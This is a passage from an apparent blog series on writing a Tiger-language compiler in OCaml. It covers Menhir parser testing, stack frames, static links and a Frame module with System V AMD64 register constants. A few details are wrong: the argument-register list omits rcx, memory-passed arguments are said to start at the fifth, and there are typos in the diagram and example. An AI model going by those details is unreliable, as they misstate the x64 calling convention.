<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>menhir --interpret --interpret-show-cst parser.mly
</span></span></code></pre></div><p>Now you can start typing expressions until you find something
that breaks your parser. Note that you can’t use token aliases
inside this REPL.</p>
<p>For example, here is how you can test a function declaration:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#434f54">LET</span> <span style="color:#434f54">FUNCTION</span> <span style="color:#434f54">ID</span> <span style="color:#434f54">LPAREN</span> <span style="color:#434f54">ID</span> <span style="color:#434f54">COLON</span> <span style="color:#434f54">ID</span> <span style="color:#434f54">RPAREN</span> <span style="color:#434f54">COLON</span> <span style="color:#434f54">ID</span> <span style="color:#434f54">EQ</span> <span style="color:#434f54">IF</span> <span style="color:#434f54">ID</span> <span style="color:#434f54">EQ</span> <span style="color:#434f54">INT</span> <span style="color:#434f54">THEN</span> <span style="color:#434f54">INT</span> <span style="color:#434f54">ELSE</span> <span style="color:#434f54">INT</span> <span style="color:#434f54">TIMES</span> <span style="color:#434f54">ID</span> <span style="color:#434f54">LPAREN</span> <span style="color:#434f54">ID</span> <span style="color:#434f54">MINUS</span> <span style="color:#434f54">INT</span> <span style="color:#434f54">RPAREN</span> <span style="color:#434f54">IN</span> <span style="color:#434f54">ID</span> <span style="color:#434f54">LPAREN</span> <span style="color:#434f54">INT</span> <span style="color:#434f54">RPAREN</span> <span style="color:#434f54">END</span>
</span></span></code></pre></div><p>That’s it for now. The full source code for this chapter
<a href="https://github.com/vyorkin/tiger/blob/master/chapter3/lib/parser.mly"  class="external-link" target="_blank" rel="noopener">is
here</a>. Next time we’re going to work on the AST for our Tiger
language.</p>
<h3 id="making-of-tiger-4-abstact-syntax">
  <span class="org-todo todo DRAFT">DRAFT</span> Making of Tiger #4, Abstract Syntax <span class="tag"><span class="ast">ast</span></span>
  <a class="heading-link" href="#making-of-tiger-4-abstact-syntax">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h4 id="intro">
  Intro
  <a class="heading-link" href="#intro">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<h3 id="making-of-tiger-5-semantic-analysis">
  <span class="org-todo todo TODO">TODO</span> Making of Tiger #5, Semantic Analysis <span class="tag"><span class="type_checking">type-checking</span></span>
  <a class="heading-link" href="#making-of-tiger-5-semantic-analysis">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h4 id="intro">
  Intro
  <a class="heading-link" href="#intro">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>I really enjoyed working through this chapter, but at the same
time implementing the type-checking phase was a bit more
difficult than working on AST, parser or lexer from the previous
chapters.</p>
<h3 id="making-of-tiger-6-stack-frames">
  <span class="org-todo done DONE">DONE</span> Making of Tiger #6, Stack frames <span class="tag"><span class="stack">stack</span><span class="memory">memory</span></span>
  <a class="heading-link" href="#making-of-tiger-6-stack-frames">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h4 id="intro">
  Intro
  <a class="heading-link" href="#intro">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>In this post we&rsquo;re going to add support for stack frames.
Here I&rsquo;ve made some notes while reading the chapter 6 to make sure I
understand things clearly.</p>
<!--list-separator-->
<ul>
<li>
<p>Stack</p>
<p>A stack is a region of memory that grows downward and shrinks
upward (like icicles). The top of the stack is it&rsquo;s <code>lowest</code>
memory address. We treat stack as a big array, with a
special register &ndash; the <strong>stack pointer (SP)</strong>.</p>
<p>The stack <strong>grows</strong> only at the entry to a function, by the
increment large enough to hold all the local variables for that
function. The stack <strong>shrinks</strong> at the exit from the function by
the same amount.</p>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Stack frame (SF)</p>
<p>We need a stack frame abstraction because:</p>
<ul>
<li>Local variables are pushed/popped in large batches on function
entry/exit</li>
<li>When local variables created they are not always initialized
right away</li>
<li>After many variables have been pushed, we want to continue
accessing variables deep within the stack</li>
</ul>
<p>A stack frame consists of:</p>
<ul>
<li>Some of local variables (others are kept in CPU registers)</li>
<li>Return address (where control should return after completion
of the current function)</li>
<li><a href="#temporaries-and-labels" >Temporaries</a> and saved registers</li>
<li>Outgoing/incoming arguments</li>
</ul>
<p>Another name for a stack frame is a function <strong>activation
record</strong>. Stack frame layout depends on the <a href="https://en.wikipedia.org/wiki/Instruction_set_architecture"  class="external-link" target="_blank" rel="noopener">ISA</a> and the
programming language being compiled.</p>
<p>Here is a typical stack frame layout:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>:    :             (higher addresses)
</span></span><span style="display:flex;"><span>:    :             previous frame
</span></span><span style="display:flex;"><span>| i1 | [FP+8]      (2-nd argument)
</span></span><span style="display:flex;"><span>| i2 | [FP+4]      (1-st argument)
</span></span><span style="display:flex;"><span>| SL | [FP]        (static link)
</span></span><span style="display:flex;"><span>-------------------------------------------------
</span></span><span style="display:flex;"><span>| l1 | [FP-4]      (1-st local variable)
</span></span><span style="display:flex;"><span>| l2 | [FP-8]      (2-nd local variable)
</span></span><span style="display:flex;"><span>:    :
</span></span><span style="display:flex;"><span>| lk | [FP-k*4]    (k-nd local variable)
</span></span><span style="display:flex;"><span>| RA | [FP-k*4-k]  (return address)
</span></span><span style="display:flex;"><span>:    :
</span></span><span style="display:flex;"><span>| t1 |             (1-st temp) temporaries and
</span></span><span style="display:flex;"><span>| t2 |             (2-nd temp) saved registers
</span></span><span style="display:flex;"><span>:    :
</span></span><span style="display:flex;"><span>| o1 |             (1-st outgoing arg) outgoing
</span></span><span style="display:flex;"><span>| o2 |             (2-nd outgoing arg) arguments
</span></span><span style="display:flex;"><span>:    :
</span></span><span style="display:flex;"><span>| SP | [FP-?]      (current stack pointer)
</span></span><span style="display:flex;"><span>-------------------------------------------------
</span></span><span style="display:flex;"><span>:    :             next frame
</span></span><span style="display:flex;"><span>:    :             (lower addresses)
</span></span></code></pre></div></li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Stack pointer (SP)</p>
<p>Always points to the top of the stack (lowest memory address in
a stack).</p>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Frame pointer (FP)</p>
<p>A term we use for convenience.</p>
<p>On entry to some function <code>f</code> we allocate a new stack frame (SF) by
subtracting the frame size from the SP and the old FP is saved
in the stack frame (SF).</p>
<p>Basically, if the frame size is fixed: <code>FP = SP + size(SF)</code>.</p>
<p>On function <strong>enter</strong>:</p>
<ul>
<li><code>SF[0...k] = V[0...k]</code> (put local variables in SF)</li>
<li><code>SF[k + 1] = FP</code> (save the current FP in SF)</li>
<li><code>FP = SP</code> (old SP becomes the current FP)</li>
</ul>
<p>On function <strong>exit</strong>:</p>
<ul>
<li><code>SP = FP</code> (copy FP back to SP)</li>
<li><code>FP = SF[k + 1]</code> (fetch back the saved FP)</li>
</ul>
<p>The size of stack frame (SF) is not known until quite late in the compilation
process, but we want to know the offsets of function arguments
and local variables much earlier. We put args and locals right
near the FP at offsets that are known early (<a href="#temporaries-and-labels" >temporaries</a> and
saved registers are known later).</p>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Registers</p>
<p>We want to use CPU registers as much as possible to make
compiled programs run faster. Also we have a limited set of
registers available and many functions that use them. We must be
able to save and restore them (to/from a stack frame).</p>
<p>We say that a register is <strong>caller-save</strong> if the caller must save
and restore it, otherwhise it is <strong>callee-save</strong>. Which registers
are preserved depends on the machine architecture.</p>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Parameters and returns addresses</p>
<p>In the early days (in 70&rsquo;s) on most machines function arguments
and return addresses were always passed on the stack. On modern
machines, for efficiency (to avoid high memory traffic), the
first several arguments, result and return address are passed in
registers. The rest args are passed in memory.</p>
 <!--list-separator-->
<ul>
<li>
<p>Why and how usage of registers helps</p>
<p>Suppose <code>f(a, b, c)</code> calls <code>g(x, y, z)</code>.</p>
<p>The <code>f</code> receives its args in registers \( r_1, r_2 \) and \( r_3
\), but it must pass the args <code>x</code>, <code>y</code> and <code>z</code> in the same
registers \( r_1, r_2 \) and \( r_3 \). So the <code>f</code> should save
those registers to its stack frame before calling <code>g</code> and we&rsquo;re back
to the memory traffic problem.</p>
<p>So how the usage of registers saved any time?</p>
<ol>
<li><strong>Leaf</strong> procedures &ndash; those that don&rsquo;t call other procedures.
The most procedures called are leafs which need not write
their incoming args to memory. And often they don&rsquo;t need to
allocate a stack frame at all.</li>
<li>Interprocedural <a href="https://en.wikipedia.org/wiki/Register_allocation"  class="external-link" target="_blank" rel="noopener">register allocation</a>. A technique used by some
optimizing compilers to analyze all the functions in an
entire program at once and assign them different registers in
which to receive parameters and hold local variables.</li>
<li>Sometimes <code>f</code> doesn&rsquo;t need its args anymore by the time it
calls <code>g</code>, so it can just overwrite corresponding registers.</li>
<li><a href="https://en.wikipedia.org/wiki/Register_window"  class="external-link" target="_blank" rel="noopener">Register windows</a> available on some architectures. Each
function can allocate a fresh set of registers without memory
traffic.</li>
</ol>
</li>
</ul>
 <!--list-separator-->
<ul>
<li>
<p>How incoming parameters are passed</p>
<p>The first <code>k</code> args \( a_1, \dots, a_k \) are passed in registers and
the rest \( a_{k+1} ,\dots, a_n \) are placed at the end of the
callers own frame.</p>
<p>If the callee needed to write any of these arguments
(including those passed in registers) to memory, it would write
them to the very beginning of its own stack frame.</p>
<p>For simplicity we&rsquo;ll assume that by default everything is passed
and kept in registers, except for cases when:</p>
<ul>
<li>variable is passed by reference</li>
<li>variable is accessed by a nested function</li>
<li>variable is too big to fit into a single register</li>
<li>array variables</li>
<li>register holding the variable is needed for some other purpose</li>
<li>there are many local variables and temporary values that they
won&rsquo;t all fit in registers</li>
</ul>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Escaping variables</p>
<p>Variable <strong>escapes</strong> if:</p>
<ul>
<li>It is passed by reference</li>
<li>It is accessed from a nested function</li>
<li>Its address is taken (not applicable for Tiger)</li>
</ul>
<p>But when the compiler sees a formal parameter or local variable
for the first time it doesn&rsquo;t yet know whether it escapes and
how many registers the calculation will require.</p>
<p>So we must assign some provisional locations (see the
<code>alloc_local</code> function) to all formals and locals, and decide
later which of them should really go in registers.</p>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Static link (SL)</p>
<ul>
<li><strong>Block structure</strong> &ndash; a feature that allow the inner functions
use variables declared in outer functions</li>
<li><strong>Static link (SL)</strong> &ndash; a pointer to the function statically
enclosing the current one</li>
</ul>
<p>Static links are stored in stack frames.</p>
<p>Example of program with nested functions in Tiger.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-F90" data-lang="F90"><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">tree</span> <span style="color:#728e00">=</span> <span style="color:#a61717">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">key</span>: <span style="color:#434f54">string</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">left</span>: <span style="color:#434f54">tree</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">right</span>: <span style="color:#434f54">tree</span>
</span></span><span style="display:flex;"><span><span style="color:#a61717">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#434f54">prettyprint</span>(<span style="color:#434f54">tree</span>: <span style="color:#434f54">tree</span>) : <span style="color:#434f54">string</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">let</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">var</span> <span style="color:#434f54">output</span> :<span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#728e00">write</span>(<span style="color:#434f54">s</span>: <span style="color:#434f54">string</span>) <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span>      <span style="color:#434f54">output</span> :<span style="color:#728e00">=</span> <span style="color:#434f54">concat</span>(<span style="color:#434f54">output</span>, <span style="color:#434f54">s</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#434f54">show</span>(<span style="color:#434f54">n</span>: <span style="color:#728e00">int</span>, <span style="color:#434f54">t</span>: <span style="color:#434f54">tree</span>) <span style="color:#728e00">=</span>       <span style="color:#728e00">&lt;---</span> [<span style="color:#8a7b52">2</span>]
</span></span><span style="display:flex;"><span>      <span style="color:#434f54">let</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">function</span> <span style="color:#434f54">indent</span>(<span style="color:#434f54">s</span>: <span style="color:#434f54">string</span>) <span style="color:#728e00">=</span> (
</span></span><span style="display:flex;"><span>          <span style="color:#434f54">for</span> <span style="color:#434f54">i</span> :<span style="color:#728e00">=</span> <span style="color:#8a7b52">1</span> <span style="color:#434f54">to</span> <span style="color:#434f54">n</span> <span style="color:#728e00">do</span>               <span style="color:#728e00">&lt;---</span> [<span style="color:#8a7b52">5</span>]
</span></span><span style="display:flex;"><span>             <span style="color:#728e00">write</span>(<span style="color:#7f8c8d">&#34; &#34;</span>);
</span></span><span style="display:flex;"><span>             <span style="color:#434f54">output</span> :<span style="color:#728e00">=</span> <span style="color:#434f54">concat</span>(<span style="color:#434f54">output</span>, <span style="color:#434f54">s</span>);
</span></span><span style="display:flex;"><span>             <span style="color:#728e00">write</span>(<span style="color:#7f8c8d">&#34;\n&#34;</span>)
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>      <span style="color:#434f54">in</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> <span style="color:#434f54">t</span> <span style="color:#728e00">=</span> <span style="color:#434f54">nil</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">then</span> <span style="color:#434f54">ident</span>(<span style="color:#7f8c8d">&#34;.&#34;</span>)                    <span style="color:#728e00">&lt;---</span> [<span style="color:#8a7b52">3</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">else</span> (
</span></span><span style="display:flex;"><span>          <span style="color:#434f54">indent</span>(<span style="color:#434f54">t</span>.<span style="color:#434f54">key</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#434f54">show</span>(<span style="color:#434f54">n</span> <span style="color:#728e00">+</span> <span style="color:#8a7b52">1</span>, <span style="color:#434f54">t</span>.<span style="color:#434f54">left</span>);             <span style="color:#728e00">&lt;---</span> [<span style="color:#8a7b52">4</span>]
</span></span><span style="display:flex;"><span>          <span style="color:#434f54">show</span>(<span style="color:#434f54">n</span> <span style="color:#728e00">+</span> <span style="color:#8a7b52">1</span>, <span style="color:#434f54">t</span>.<span style="color:#434f54">right</span>)
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>      <span style="color:#728e00">end</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">in</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">show</span>(<span style="color:#8a7b52">0</span>, <span style="color:#434f54">tree</span>);                         <span style="color:#728e00">&lt;---</span> [<span style="color:#8a7b52">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">output</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">end</span>
</span></span></code></pre></div><ol>
<li><code>prettyprint</code> calls <code>show</code>, passing <code>prettyprint</code>&rsquo;s own frame
pointer (FP) as <code>show</code>&rsquo;s static link (SL)</li>
<li><code>show</code> stores its static link (SL) into its own stack frame</li>
<li><code>show</code> calls <code>indent</code>, passing its own frame pointer (FP) as
<code>indent</code>&rsquo;s SL</li>
<li><code>show</code> calls <code>show</code>, passing its own static link as SL</li>
<li><code>indent</code> uses the value <code>n</code> from <code>show</code>&rsquo;s frame, it can find
<code>n</code> by using the SL (which points at the stack frame of
<code>show</code>)</li>
</ol>
<p>Each call requires a one or more fetches using static links to resolve
variables declared in outer functions.</p>
</li>
</ul>
<h4 id="interface">
  Interface
  <a class="heading-link" href="#interface">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<!--list-separator-->
<ul>
<li>
<p>Stack frame and calling conventions</p>
<p>Every machine architecture might have a different standard stack
frame layout.</p>
<p>Suppose we have a call of the following function <code>g(x1, x2, x3)</code>
where the 1-st parameter escapes. Here is an example of how the
<code>Frame.mk g [true; false; false]</code> works on three different
architecture.</p>
 <style>
 .sane-table table {
   border-collapse: collapse;
   width: 100%;
 }
 .sane-table th,
 .sane-table td {
   padding: 0.25rem;
   text-align: center;
   border: 0;
 }
 .list-table table {
   width: 30rem;
 }
 .list-table td {
   text-align: left;
 }
 </style>
 <div class="ox-hugo-table sane-table">
<table>
<thead>
<tr>
<th>Architecture</th>
<th>Formals</th>
</tr>
</thead>
<tbody>
<tr>
<td>Pentium</td>
<td><code>[InFrame 8; InFrame 12; InFrame 16]</code></td>
</tr>
<tr>
<td>MIPS</td>
<td><code>[InFrame 0; InReg t157; InReg t158]</code></td>
</tr>
<tr>
<td>SPARC</td>
<td><code>[InFrame 8; InReg t157; InReg t158]</code></td>
</tr>
</tbody>
</table>
 </div>
 <div class="ox-hugo-table sane-table">
<table>
<thead>
<tr>
<th>Pentium</th>
<th>MIPS</th>
<th>SPARC</th>
</tr>
</thead>
<tbody>
<tr>
<td>\( SF_{SP+0} \leftarrow FP \)</td>
<td>\( SP \leftarrow SP-k \)</td>
<td>SAVE \(\ SP \), \( -k \), \(\ SP \)</td>
</tr>
<tr>
<td>\( FP \leftarrow SP \)</td>
<td>\( SF_{SP+k+0} \leftarrow r_2 \)</td>
<td>\( SF_{FP+68} \leftarrow i_0 \)</td>
</tr>
<tr>
<td>\( SP \leftarrow SP-k \)</td>
<td>\( t_{157} \leftarrow r_4 \)</td>
<td>\( t_{157} \leftarrow i_1 \)</td>
</tr>
<tr>
<td></td>
<td>\( t_{157} \leftarrow r_5 \)</td>
<td>\( t_{158 }\leftarrow i_2 \)</td>
</tr>
</tbody>
</table>
 </div>
<ul>
<li>\(SF\) &ndash; Stack frame memory region</li>
<li>\(k\)  &ndash; Number of formal parameters</li>
<li>\(t\)  &ndash; Temporary location</li>
<li>\(r_i\) &ndash; MIPS registers</li>
<li>\(i_i\) &ndash; SPARC registers</li>
</ul>
<p>Thats why we&rsquo;ll use an abstract interface for stack frames.</p>
<p>Most of PC&rsquo;s and laptops are based on the x86 and x64 ISA.
Mobile devices usually based on the ARM ISA.</p>
<ul>
<li><strong>x86</strong> &ndash; family of (32-bit) ISA based on the Intel 8086 and 8088 microprocessors</li>
<li><strong>x64</strong> &ndash; a 64-bit version of the x86 ISA supporting larger
amounts of virtual and physical memory + additional
general-purpose registers</li>
</ul>
<p><strong>x86</strong></p>
<ul>
<li>Has 8 general-purpose registers: <code>eax, ebx, ecx, edx, ebp, esp, esi, edi</code></li>
<li>32-bit (4-byte) <a href="https://en.wikipedia.org/wiki/Word_%28computer_architecture%29"  class="external-link" target="_blank" rel="noopener">words</a></li>
</ul>
<p><strong>x64</strong></p>
<ul>
<li>Has 16 general-purpose registers: <code>rax, rbx, rcx, rdx, rbp, rsp, rsi, rdi</code>, <code>r8 - r15</code></li>
<li>64-bit (8-byte) words</li>
</ul>
<p>Lets use the x64 ISA, there are 2 flavours of it:</p>
<ul>
<li>Microsoft x64</li>
<li>System V AMD64 (which I prefer)</li>
</ul>
<p>According to the System V AMD64 ABI, the first 6 integer
arguments are passed in left-to-right order in <code>rdi</code>, <code>rsi</code>, <code>rdx</code>,
<code>rcx</code>, <code>r8</code> and <code>r9</code> registers, respectively.</p>
<p>Arguments 5 and higher are passed in memory. They are pushed
onto the stack in reversed (right-to-left) order.</p>
<p>Helpful links:</p>
<ul>
<li><a href="http://refspecs.linuxfoundation.org/elf/x86_64-abi-0.99.pdf"  class="external-link" target="_blank" rel="noopener">System
V AMD64 ABI</a> (page 12)</li>
<li><a href="https://en.wikipedia.org/wiki/X86_calling_conventions"  class="external-link" target="_blank" rel="noopener">Calling
conventions (Wikipedia)</a></li>
<li><a href="https://wiki.osdev.org/Calling_Conventions"  class="external-link" target="_blank" rel="noopener">Calling
conventions (OS Dev)</a></li>
</ul>
<p>Here is our interface for a stack frame:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#95a5a6">(** Holds information about formal parameters and
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    local variables allocated in this frame *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">t</span> <span style="color:#728e00">[@@</span><span style="color:#434f54">deriving</span> <span style="color:#434f54">show</span><span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Abstract location of a formal parameter (function argument) or
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    a local variable that may be placed in a frame or in a register *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">access</span> <span style="color:#728e00">[@@</span><span style="color:#434f54">deriving</span> <span style="color:#434f54">show</span><span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Makes a new frame for a function with the
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    given label and formal parameters *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">mk</span> <span style="color:#728e00">:</span> <span style="color:#434f54">Temp</span>.<span style="color:#434f54">label</span> <span style="color:#728e00">-&gt;</span> <span style="color:#00979d">bool</span> <span style="color:#00979d">list</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">t</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Extracts a list of accesses denoting
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    the locations where the formal parameters will be
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    kept at runtime, as seen from inside the callee *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">formals</span> <span style="color:#728e00">:</span> <span style="color:#434f54">t</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">access</span> <span style="color:#00979d">list</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(** Allocates a new local variable in the given frame or in a register.
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    The boolean argument specifies whether the new variable
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    escapes and needs to go in the frame.
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    Returns &#34;in-memory&#34; access with an offset from the frame pointer or
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">    &#34;in-register&#34; access in case if it can be allocated in a register *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">val</span> <span style="color:#434f54">alloc_local</span> <span style="color:#728e00">:</span> <span style="color:#434f54">t</span> <span style="color:#728e00">-&gt;</span> <span style="color:#00979d">bool</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">access</span>
</span></span></code></pre></div><p>To make a new frame for some function <code>f</code> we&rsquo;ll call <code>Frame.mk label formals</code>, where:</p>
<ul>
<li><code>label: Temp.label</code> &ndash; static memory address of the <code>f</code>
function (that is yet to be determined)</li>
<li><code>formals: bool list</code> &ndash; <code>true</code> for each parameter
that escapes and <code>false</code> for each that doesn&rsquo;t</li>
</ul>
<p>The stack frame should contain information about formal
parameters and local variables allocated:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">t</span> <span style="color:#728e00">=</span> <span style="color:#728e00">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* label at which the function&#39;s machine code begins *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">label</span><span style="color:#728e00">:</span> <span style="color:#434f54">Temp</span>.<span style="color:#434f54">label</span><span style="color:#728e00">;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* locations of all the formals *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">formals</span><span style="color:#728e00">:</span> <span style="color:#434f54">access</span> <span style="color:#00979d">list</span><span style="color:#728e00">;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* number of locals allocated so far *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">locals</span><span style="color:#728e00">:</span> <span style="color:#00979d">int</span> <span style="color:#434f54">ref</span><span style="color:#728e00">;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* instructions required to implement the &#34;view shift&#34; *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">instrs</span><span style="color:#728e00">:</span> <span style="color:#434f54">Instruction</span>.<span style="color:#434f54">t</span> <span style="color:#00979d">list</span><span style="color:#728e00">;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">}</span> <span style="color:#728e00">[@@</span><span style="color:#434f54">deriving</span> <span style="color:#434f54">show</span><span style="color:#728e00">]</span>
</span></span></code></pre></div><p>We don&rsquo;t want to implement the <a href="#view-shift" >view shift</a> right now, so the
<code>Instruction.t</code> is defined like this:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#728e00">type</span> <span style="color:#434f54">t</span> <span style="color:#728e00">=</span> <span style="color:#00979d">unit</span> <span style="color:#728e00">[@@</span><span style="color:#434f54">deriving</span> <span style="color:#434f54">show</span><span style="color:#728e00">]</span>
</span></span></code></pre></div></li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>ABI</p>
<p>Lets add some constants for System V ADM64 ABI to the <code>Frame</code>
module. We&rsquo;ll need them later.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ocaml" data-lang="ocaml"><span style="display:flex;"><span><span style="color:#95a5a6">(* word size in bytes *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">word_size</span> <span style="color:#728e00">=</span> <span style="color:#434f54">64</span> <span style="color:#728e00">/</span> <span style="color:#434f54">8</span> <span style="color:#95a5a6">(* = 8 bytes *)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(* special registers *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">fp</span> <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;rbp&#34;</span> <span style="color:#95a5a6">(* frame pointer *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">sp</span> <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;rsp&#34;</span> <span style="color:#95a5a6">(* stack pointer *)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">(* x64 &#34;parameter&#34;-registers *)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">rdi</span> <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;rdi&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">rsi</span> <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;rsi&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">rdx</span> <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;rdx&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">rcx</span> <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;rcx&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span>	<span style="color:#434f54">r8</span>  <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;r8&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">r9</span>  <span style="color:#728e00">=</span> <span style="color:#7f8c8d">&#34;r9&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">arg_regs</span> <span style="color:#728e00">=</span> <span style="color:#728e00">[</span><span style="color:#434f54">rdi</span><span style="color:#728e00">;</span> <span style="color:#434f54">rsi</span><span style="color:#728e00">;</span> <span style="color:#434f54">rdx</span><span style="color:#728e00">;</span> <span style="color:#434f54">r8</span><span style="color:#728e00">;</span> <span style="color:#434f54">r9</span><span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>
